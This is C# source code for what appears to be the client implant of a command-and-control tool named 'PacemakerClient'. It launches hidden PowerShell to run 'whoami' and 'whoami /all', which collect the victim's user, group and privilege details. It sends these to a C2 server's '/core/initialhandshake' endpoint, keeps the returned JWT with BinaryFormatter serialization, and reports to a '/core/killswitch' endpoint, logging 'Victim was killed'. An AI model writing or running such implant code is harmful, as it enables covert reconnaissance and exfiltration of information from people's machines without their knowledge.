using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using Newtonsoft.Json;
using PacemakerClient;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

namespace PacemakerClient_cli
{
    public class VictimJson
    {
        public string victimName {  get; set; }
        public string victimAdditionalinfo { get; set;}
    }

    internal class Program
    {
        public static string server_hostname = "http://localhost:3000";
        public static BinaryFormatter bf;
        public static AuthCore authObj;
        static Stream file_stream;

        public async static Task InitialHandshake()
        {
            HttpClient Client = new HttpClient();

            VictimJson victimJson = new VictimJson
            {
                victimName = GetUserInfo("name"),
                victimAdditionalinfo = GetUserInfo("description")
            };


            string output = JsonConvert.SerializeObject(victimJson);

            var content = new StringContent(output, Encoding.UTF8, "application/json");

            var json = await Client.PutAsync(server_hostname + "/core/initialhandshake", content);

            string jsonResponse;

            if (json.IsSuccessStatusCode)
            {
                jsonResponse = await json.Content.ReadAsStringAsync();

                authObj = JsonConvert.DeserializeObject<AuthCore>(jsonResponse);

                bf = new BinaryFormatter();
                Stream stream1;
                stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
                bf.Serialize(stream1, authObj);
                stream1.Close();

            }

            // string fullPath = Environment.CurrentDirectory + "\\log.txt";

            /* using (StreamWriter writer = new StreamWriter(fullPath))
            {
                writer.WriteLine(json.ToString());
                writer.WriteLine(jsonResponse.ToString());
            }*/

        }

        public static string GetUserInfo(string option)
        {

            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            

            if (option == "name")
            {
                process.Start();
                process.StandardInput.WriteLine("whoami > result.txt");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
            }
            else
            {
                process.Start();
                process.StandardInput.WriteLine("whoami /all > result.txt");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
            }

            if (File.Exists("result.txt"))
            {

                StreamReader sr = new StreamReader(Environment.CurrentDirectory + "\\result.txt");
                // read everything from file
                string result = sr.ReadToEnd();

                sr.Close();

                return result;

            }
            else
            {
                return "result file not created !";
            }
        }


        public async static Task KillSwitch()
        {
            HttpClient Client = new HttpClient();

            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt-key\": \"" + authObj.JwtToken + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var json = await Client.PostAsync(server_hostname + "/core/killswitch", content);

            string fullPath = Environment.CurrentDirectory + "\\killed.txt";

            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                var jsonResponse = await json.Content.ReadAsStringAsync();
                writer.WriteLine(jsonResponse.ToString());
                writer.WriteLine(json.ToString());
                writer.WriteLine("\n\nVictim was killed...");
            }

            return;
        }

        static async Task Main(string[] args)
        {

            if (File.Exists("authObject.dat"))
            {
                try
                {
                    BinaryFormatter bf5 = new BinaryFormatter();                                            ///deserealzing all the survey answer objects into the main 
                    Stream stream2;                                                                         /// Survey answer list...
                    stream2 = File.Open("authObject.dat", FileMode.Open);
                    authObj = (AuthCore)bf5.Deserialize(stream2);                         /// the label will update accordingly....
                    stream2.Close();

                }catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    await InitialHandshake();
                    Console.WriteLine("Finished authenticating");
                }
               
            }
            else
            {
                file_stream = File.Create("authObject.dat");
                file_stream.Close();

                await InitialHandshake();
        
                Console.WriteLine("Finished authenticating");
            }


            Console.WriteLine("\nDoing something....\n");
            Thread.Sleep(2000);
           
            await KillSwitch();

            Console.WriteLine("Done");
        }
    }
}
